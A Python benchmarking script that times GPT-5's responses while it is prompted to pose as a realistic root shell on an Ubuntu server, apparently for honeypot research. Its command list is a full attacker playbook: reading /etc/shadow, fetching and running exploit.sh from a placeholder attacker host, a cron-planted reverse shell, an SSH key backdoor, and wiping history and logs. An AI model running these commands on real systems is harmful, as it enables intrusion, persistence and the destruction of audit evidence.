import os
import time
import copy
from statistics import mean, stdev

# System prompt
SYSTEM_PROMPT = "You are the shell of a Ubuntu server. The user is remotely connected via SSH, but this is not a pty session.\n\nAlways respond as an extremely realistic shell. You are NOT assistant. NEVER explain anything or be conversational.\n\nCurrent user: root"

# Initial messages for OpenAI-compatible APIs
INITIAL_MESSAGES = [
    {"role": "system", "content": SYSTEM_PROMPT},
    {"role": "user", "content": "whoami"},
    {"role": "assistant", "content": "root\nroot@prod-web-nyc-01:~#"},
    {"role": "user", "content": "uname -a"},
    {"role": "assistant", "content": "Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\nroot@prod-web-nyc-01:~#"}
]

# Commands to test
COMMANDS = [
    "uname -a",
    "whoami",
    "id",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "cat /etc/os-release",
    "ps aux",
    "netstat -antup",
    "ss -antup",
    "ifconfig",
    "ip a",
    "sudo -l",
    "history",
    "find / -perm -u=s -type f 2>/dev/null",
    "sudo su",
    "wget http://<attacker-ip>/exploit.sh",
    "curl -o exploit.sh http://<attacker-ip>/exploit.sh",
    "chmod +x exploit.sh",
    "./exploit.sh",
    "crontab -l",
    "echo '0 * * * * /bin/bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\"' | crontab -",
    "echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys",
    "ssh user@<internal-ip>",
    "history -c",
    "unset HISTFILE",
    "rm -f /var/log/auth.log",
    "cat /dev/null > /var/log/wtmp"
]

NUM_RUNS = 5


def test_gpt(command):
    """Test a command with GPT and return elapsed time. Fresh client each call."""
    from openai import OpenAI
    client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
    messages = copy.deepcopy(INITIAL_MESSAGES)
    messages.append({"role": "user", "content": command})
    start_time = time.time()
    client.chat.completions.create(model="gpt-5", messages=messages)
    return time.time() - start_time


def main():
    print("=" * 60)
    print("GPT-5 Shell Command Timing Test")
    print(f"Commands: {len(COMMANDS)}")
    print(f"Runs: {NUM_RUNS} (all commands per run, sequential)")
    print(f"Total tests: {len(COMMANDS) * NUM_RUNS}")
    print("=" * 60)
    
    all_times = []
    total_tests = len(COMMANDS) * NUM_RUNS
    completed = 0
    
    for run in range(1, NUM_RUNS + 1):
        print(f"\n--- Run {run}/{NUM_RUNS} ---")
        
        for cmd_idx, command in enumerate(COMMANDS, start=1):
            try:
                elapsed = test_gpt(command)
                all_times.append(elapsed)
                completed += 1
                print(f"  [{completed}/{total_tests}] Cmd {cmd_idx}: {command[:25]}... ({elapsed:.2f}s)")
            except Exception as e:
                completed += 1
                print(f"  [{completed}/{total_tests}] Cmd {cmd_idx}: {command[:25]}... ERROR: {str(e)[:40]}")
    
    if all_times:
        avg_time = mean(all_times)
        std_time = stdev(all_times) if len(all_times) > 1 else 0.0
        min_time = min(all_times)
        max_time = max(all_times)
        results = [
            "GPT-5",
            f"  Average: {avg_time:.2f}s",
            f"  Std Dev: {std_time:.2f}s",
            f"  Min:     {min_time:.2f}s",
            f"  Max:     {max_time:.2f}s"
        ]
    else:
        results = ["GPT-5: No successful tests"]
    
    with open("gpt_times.txt", "w") as f:
        for line in results:
            f.write(line + "\n")
    
    print("\n" + "=" * 60)
    print("Results saved to gpt_times.txt")
    print("=" * 60)
    for line in results:
        print(line)


if __name__ == "__main__":
    main()
